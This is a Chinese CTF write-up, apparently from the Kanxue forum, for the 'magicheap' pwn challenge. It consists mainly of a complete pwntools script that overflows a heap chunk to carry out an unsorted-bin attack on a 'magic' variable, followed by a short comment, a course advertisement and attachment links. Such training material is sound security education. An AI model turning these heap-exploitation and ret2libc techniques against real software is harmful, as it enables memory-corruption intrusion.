
# Exploit 脚本

```python
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
    if path == '':
        libc = LibcSearcher(func, leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        binsh = base + libc.dump('str_bin_sh')
    else:
        libc = ELF(path)
        base = leak - libc.sym[func]
        system = base + libc.sym['system']
        binsh = base + libc.search('/bin/sh').next()
    return (base, system, binsh)

s = lambda data : p.send(str(data))
sa = lambda delim,data : p.sendafter(delim, str(data))
sl = lambda data : p.sendline(str(data))
sla = lambda delim,data : p.sendlineafter(delim, str(data))
r = lambda num=4096 : p.recv(num)
ru = lambda delims, drop=True : p.recvuntil(delims, drop)
uu64 = lambda data : u64(data.ljust(8,'\0'))
leak = lambda name,addr : log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './magicheap'
context.binary = binary
elf = ELF(binary, checksec=False)
# p = remote('node3.buuoj.cn',29230) if argv[1]=='r' else process(binary)
p = process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

def dbg():
    gdb.attach(p)
    pause()

def create(size, content):
    ru("choice :")
    sl("1")
    ru("Heap : ")
    sl(str(size))
    ru("heap:")
    sl(content)

def edit(idx, size, content):
    ru("choice :")
    sl("2")
    ru("Index :")
    sl(str(idx))
    ru("Heap : ")
    sl(str(size))
    ru("heap : ")
    sl(content)

def delete(idx):
    ru("choice :")
    sl("3")
    ru("Index :")
    sl(str(idx))

create(300,'a'*300) # 0
create(400,'a'*400) # 1
create(500,'a'*500) # 2

delete(1)
#dbg()

fake_chunk_addr = 0x6020b0
# chunk0 user data + chunk1 prev size + chunk1 size + chunk1 fd + &magic-4
payload = 'b'*0x130 + p64(0) + p64(0x1a1) + p64(0) + p64(fake_chunk_addr)
edit(0,700,payload)
#dbg()

create(400,'c'*400)
#dbg()

ru("choice :")
sl(str(4869))
ru("Congrt !\n")
flag = ru("\n")
print(flag)

p.interactive()
```

> 这一题还是比较简单的。做完之后我去看ctfwiki的题解，感觉我的脑袋僵硬了:( -> `malloc` 的三个 `chunk`，只要保证第二个 `chunk` 在释放的时候会放到 `unsorted bin` 里去就可以了，不需要三个都是 `smallbin` `chunk`。

## 参考文献

- [ctfwiki](https://bbs.kanxue.com/elink@c55K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6Y4L8r3W2T1j5#2)9J5k6r3S2W2j5i4m8Q4x3V1k6#2L8Y4y4G2M7Y4c8W2k6q4)9#2k6X3u0A6L8W2)9#2k6X3q4@1N6r3q4U0K9#2)9J5c8R3`.`.)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

## 附件

上传的附件：

- [magicheap](javascript:void(0);)
  （13.23kb，9次下载）
- [magicheap.i64](javascript:void(0);)
  （177.43kb，8次下载）
